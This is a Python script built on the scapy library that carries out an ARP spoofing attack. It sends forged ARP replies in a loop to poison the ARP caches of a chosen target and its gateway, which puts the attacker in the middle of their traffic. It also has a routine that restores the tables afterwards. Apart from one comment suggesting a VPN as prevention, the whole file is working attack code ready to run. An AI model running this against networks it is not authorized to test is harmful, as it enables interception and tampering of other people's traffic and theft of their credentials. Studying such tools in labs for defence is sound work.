import scapy.all as scapy
import time


# Packet forwarding must be enabled for this attack to work (sudo sysctl -w net.ipv4.ip_forward=1)
# PREVENTION : RELY ON VPN
# when you use a VPN, you’re using an encrypted tunnel that largely blocks your activity from ARP spoofing hackers.


# Spoofing IP address
def ARP_poison(targetIP, spoofIP):
    pkt = scapy.ARP(op=2, pdst=targetIP, hwdst=MAC_address(targetIP), psrc=spoofIP)
    scapy.send(pkt, verbose=False)


# Restoring ARP tables of target ip
def restore(destinationIP, sourceIP):
    destinationMAC = MAC_address(destinationIP)
    sourceMAC = MAC_address(sourceIP)
    pkt = scapy.ARP(op=2, pdst=destinationIP, hwdst=destinationMAC, psrc=sourceIP, hwsrc=sourceMAC)
    scapy.send(pkt, verbose=False)


# Function to send ARP request to get target MAC address
def MAC_address(ip):
    # Sending ARP request
    # arp request broadcast = broadcast/arp_request
    arppacket = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
    targetMAC = scapy.srp(arppacket, timeout=5, verbose=False)[0][0][1].hwsrc
    return targetMAC


if __name__ == "__main__":

    # Getting Target and gateway IP from user input
    targetIP = input("Enter Target IP address : ")
    gatewayIP = input("Enter Gateway IP address : ")

    sent_packets_count = 0
    while True:
        # SPOOFING
        ARP_poison(targetIP, gatewayIP)
        ARP_poison(gatewayIP, targetIP)
        sent_packets_count = sent_packets_count + 2
        print("\r[*] Packets Sent " + str(sent_packets_count), end="")

        if sent_packets_count % 15 == 0:
            choice = input("\nDo you wish to continue ..? [ Y / N ] : ")
            if choice == "N":
                print("\nCtrl + C pressed.............Exiting")
                # RESTORING
                restore(gatewayIP, targetIP)
                restore(targetIP, gatewayIP)
                print("[+] Arp Spoof Stopped")
                break
            else:
                continue